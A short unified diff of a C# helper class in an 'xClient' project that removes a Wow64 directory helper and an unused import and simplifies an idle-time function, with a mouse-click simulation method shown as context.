@@ -1,6 +1,5 @@
 ﻿using System.Drawing;
 using System.Runtime.InteropServices;
-using System.Text;
 using xClient.Core.Utilities;
 
 namespace xClient.Core.Helper
@@ -21,18 +20,7 @@ namespace xClient.Core.Helper
             lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo);
             lastInputInfo.dwTime = 0;
 
-            if (NativeMethods.GetLastInputInfo(ref lastInputInfo))
-                return lastInputInfo.dwTime;
-            return 0;
-        }
-
-        public static string GetSystemWow64Directory()
-        {
-            var path = string.Empty;
-            var buffer = new StringBuilder(260); // MAX_PATH
-            if (NativeMethods.GetSystemWow64Directory(buffer, (uint)buffer.Capacity) != 0)
-                path = buffer.ToString();
-            return path;
+            return NativeMethods.GetLastInputInfo(ref lastInputInfo) ? lastInputInfo.dwTime : 0;
         }
 
         public static void DoMouseLeftClick(Point p, bool isMouseDown)
